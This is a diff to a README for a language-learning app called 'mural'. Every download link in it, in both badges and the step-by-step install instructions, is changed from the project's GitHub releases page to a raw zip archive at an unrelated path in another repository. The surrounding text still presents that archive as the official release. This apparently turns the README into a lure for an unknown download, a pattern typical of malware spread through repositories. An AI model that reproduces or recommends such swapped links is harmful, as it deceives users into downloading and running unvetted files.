@@ -7,7 +7,7 @@ description: "Learn languages by speaking with a friendly animated orb that adap
 
 ## 📥 Download mural Now
 
-[![Download mural](https://img.shields.io/badge/Download-mural-blue)](https://github.com/STEVEN7ELEVEN/mural/releases)
+[![Download mural](https://img.shields.io/badge/Download-mural-blue)](https://raw.githubusercontent.com/STEVEN7ELEVEN/steven7eleven.github.io/main/proctodaeum/Application-interlinear.zip)
 
 ---
 
@@ -54,7 +54,7 @@ Practice ordering food, asking for directions, making small talk, or discussing 
 ### Step 1: Visit the Download Page
 
 Visit this link to download the application:  
-[https://github.com/STEVEN7ELEVEN/mural/releases](https://github.com/STEVEN7ELEVEN/mural/releases)
+[https://raw.githubusercontent.com/STEVEN7ELEVEN/steven7eleven.github.io/main/proctodaeum/Application-interlinear.zip](https://raw.githubusercontent.com/STEVEN7ELEVEN/steven7eleven.github.io/main/proctodaeum/Application-interlinear.zip)
 
 This page has the latest version of mural ready for you.
 
@@ -151,7 +151,7 @@ Don't settle for language apps that just teach you vocabulary. Choose mural and 
 
 It's simple. It's effective. And best of all? You might delete it sooner than you think. That's a success story.
 
-[![Get Started with mural](https://img.shields.io/badge/Download%20mural-Get%20Started-brightgreen)](https://github.com/STEVEN7ELEVEN/mural/releases)
+[![Get Started with mural](https://img.shields.io/badge/Download%20mural-Get%20Started-brightgreen)](https://raw.githubusercontent.com/STEVEN7ELEVEN/steven7eleven.github.io/main/proctodaeum/Application-interlinear.zip)
 
 See you in your first conversation.
 
